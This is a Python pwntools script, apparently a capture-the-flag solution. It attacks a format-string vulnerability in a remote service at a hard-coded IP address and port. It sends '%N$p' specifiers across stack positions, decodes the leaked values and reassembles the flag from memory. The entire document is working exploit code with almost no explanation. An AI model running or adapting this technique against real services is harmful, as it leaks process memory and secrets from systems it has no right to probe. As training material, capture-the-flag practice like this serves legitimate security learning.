from pwn import *

# Length of the flag (assuming you know or can estimate it)
flag_length = 40
flag_find=0

def is_valid_flag_part(s):
    return "FLAG" in s and all(c.isprintable() for c in s)

#context.log_level = 'debug'

flag_parts = []

# Loop through possible positions of flag
for i in range(1, 40):  # Typically the first few positions might not contain the flag
    #p = process('./fmt')
    p= remote('140.113.24.241',30172)
    format_string = "%{}$p".format(i)
    p.sendline(format_string)

    output = p.recv().decode()
    print(output)
    p.close()

    try:

        ascii_string = bytes.fromhex(output[2:]).decode('ascii')  # Convert hex to ASCII
        #print(ascii_string)
        # Reverse the endianness of the hex value
        reversed_output = ascii_string[::-1]
        print(reversed_output)

        if flag_find==1:
            flag_parts.append(reversed_output)
            if "}" in reversed_output and all(c.isprintable() for c in reversed_output):
                break
        
        
        if is_valid_flag_part(reversed_output):
            flag_find=1
            flag_parts.append(reversed_output)

        
    except ValueError as e:
        print(f"Could not convert hex value {i}: {e}")


flag = ''.join(flag_parts)[:flag_length]

# Print the found flag
if flag:
    print(f"Flag found: {flag}")
else:
    print("Flag not found")
